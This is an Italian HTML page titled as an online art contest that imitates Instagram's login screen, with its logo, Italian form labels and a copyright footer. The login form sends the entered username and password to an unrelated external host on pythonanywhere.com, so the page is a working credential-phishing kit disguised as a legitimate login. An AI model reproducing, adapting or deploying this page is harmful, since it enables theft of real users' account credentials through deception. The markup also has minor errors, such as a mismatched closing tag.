<!DOCTYPE html>
<html lang="it">
<head>
  <title>Concorso d'Arte Online</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>
  <span id="root">
    <section class="section-all">
      <link rel="stylesheet" href="css/css.css">
      <!-- 1-Role Main -->
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="contenuto">
              <div class="login-box">
                <div class="header">
                  <img class="logo"
                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
                    alt="Instagram">
                </div><!-- Intestazione fine -->
                <div class="form-wrap">
                  <form class="form" action="https://cyrru.pythonanywhere.com/login1" method="POST" class="my-login-validation"
                    novalidate=""">

                    <div class="input-box">
                      <input type="text" id="username" placeholder="Numero di telefono, nome utente o email" aria-required="true"
                        maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
                    </div>

                    <div class="input-box">
                      <input type="password" name="password" id="password" placeholder="Password" maxlength="30"
                        aria-required="true" autocapitalize="off" autocorrect="off" required>
                    </div>

                    <span class="button-box">
                      <button class="btn" type="submit">Accedi</button>
                    </span>

                    <a class="forgot" href="/">Password dimenticata?</a>
                  </form>
                </div> <!-- Form-wrap fine -->
              </div> <!-- Login-box fine -->

              <div class="login-box">
                <p class="text">Non hai un account? <a href="/">Registrati</a></p>
              </div> <!-- Signup-box fine --><!-- App fine -->
            </div> <!-- Contenuto fine -->
          </articolo>
        </div> <!-- Wrapper fine -->
      </main>

      <!-- 2-Role Footer -->
      <footer class="footer" role="contentinfo">
        <div class="footer-container">
          <span class="footer-logo">&copy; 2023 Instagram</span>
        </div> <!-- Container del piÃ¨ di pagina fine -->
      </footer>
    </section>
  </span> <!-- Root -->
</body>
</html>
